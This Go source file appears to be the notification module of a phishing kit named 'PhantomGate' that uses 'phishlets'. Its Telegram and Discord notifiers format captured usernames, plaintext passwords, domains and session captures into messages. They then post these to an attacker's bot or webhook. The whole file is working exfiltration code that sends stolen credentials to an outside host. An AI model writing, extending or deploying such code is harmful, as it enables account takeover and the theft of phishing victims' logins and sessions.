package notifications

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type TelegramNotifier struct {
	botToken string
	chatID   string
	client   *http.Client
}

type DiscordNotifier struct {
	webhookURL string
	client     *http.Client
}

type CredentialAlert struct {
	Username   string    `json:"username"`
	Password   string    `json:"password"`
	Domain     string    `json:"domain"`
	Phishlet   string    `json:"phishlet"`
	CapturedAt time.Time `json:"captured_at"`
}

type SessionAlert struct {
	Username   string    `json:"username"`
	Domain     string    `json:"domain"`
	Phishlet   string    `json:"phishlet"`
	CapturedAt time.Time `json:"captured_at"`
}

func NewTelegramNotifier(botToken, chatID string) *TelegramNotifier {
	return &TelegramNotifier{
		botToken: botToken,
		chatID:   chatID,
		client:   &http.Client{Timeout: 10 * time.Second},
	}
}

func (t *TelegramNotifier) sendMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)
	
	payload := map[string]interface{}{
		"chat_id":    t.chatID,
		"text":       message,
		"parse_mode": "Markdown",
	}
	
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	resp, err := t.client.Post(url, "application/json", bytes.NewReader(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(body))
	}
	
	return nil
}

func (t *TelegramNotifier) SendCredentialCapture(alert *CredentialAlert) error {
	message := fmt.Sprintf("🔑 *New Credential Captured*\n\n👤 Username: `%s`\n🔒 Password: `%s`\n🌐 Domain: `%s`\n📋 Phishlet: `%s`\n⏰ Time: %s",
		alert.Username,
		alert.Password,
		alert.Domain,
		alert.Phishlet,
		alert.CapturedAt.Format("2006-01-02 15:04:05"),
	)
	
	return t.sendMessage(message)
}

func (t *TelegramNotifier) SendSessionCapture(alert *SessionAlert) error {
	message := fmt.Sprintf("🍪 *New Session Captured*\n\n👤 Username: `%s`\n🌐 Domain: `%s`\n📋 Phishlet: `%s`\n⏰ Time: %s",
		alert.Username,
		alert.Domain,
		alert.Phishlet,
		alert.CapturedAt.Format("2006-01-02 15:04:05"),
	)
	
	return t.sendMessage(message)
}

func NewDiscordNotifier(webhookURL string) *DiscordNotifier {
	return &DiscordNotifier{
		webhookURL: webhookURL,
		client:     &http.Client{Timeout: 10 * time.Second},
	}
}

func (d *DiscordNotifier) sendMessage(embed map[string]interface{}) error {
	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{embed},
	}
	
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	resp, err := d.client.Post(d.webhookURL, "application/json", bytes.NewReader(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 204 && resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord webhook error: %s", string(body))
	}
	
	return nil
}

func (d *DiscordNotifier) SendCredentialCapture(alert *CredentialAlert) error {
	embed := map[string]interface{}{
		"title":       "🔑 New Credential Captured",
		"description": fmt.Sprintf("**Username:** `%s`\n**Password:** `%s`\n**Domain:** `%s`\n**Phishlet:** `%s`", alert.Username, alert.Password, alert.Domain, alert.Phishlet),
		"color":       16711680,
		"fields": []map[string]interface{}{
			{"name": "Username", "value": alert.Username, "inline": true},
			{"name": "Password", "value": alert.Password, "inline": true},
			{"name": "Domain", "value": alert.Domain, "inline": true},
		},
		"footer": map[string]interface{}{
			"text": fmt.Sprintf("PhantomGate | %s", alert.CapturedAt.Format("2006-01-02 15:04:05")),
		},
	}
	
	return d.sendMessage(embed)
}

func (d *DiscordNotifier) SendSessionCapture(alert *SessionAlert) error {
	embed := map[string]interface{}{
		"title":       "🍪 New Session Captured",
		"description": fmt.Sprintf("**Username:** `%s`\n**Domain:** `%s`\n**Phishlet:** `%s`", alert.Username, alert.Domain, alert.Phishlet),
		"color":       65280,
		"fields": []map[string]interface{}{
			{"name": "Username", "value": alert.Username, "inline": true},
			{"name": "Domain", "value": alert.Domain, "inline": true},
			{"name": "Phishlet", "value": alert.Phishlet, "inline": true},
		},
		"footer": map[string]interface{}{
			"text": fmt.Sprintf("PhantomGate | %s", alert.CapturedAt.Format("2006-01-02 15:04:05")),
		},
	}
	
	return d.sendMessage(embed)
}
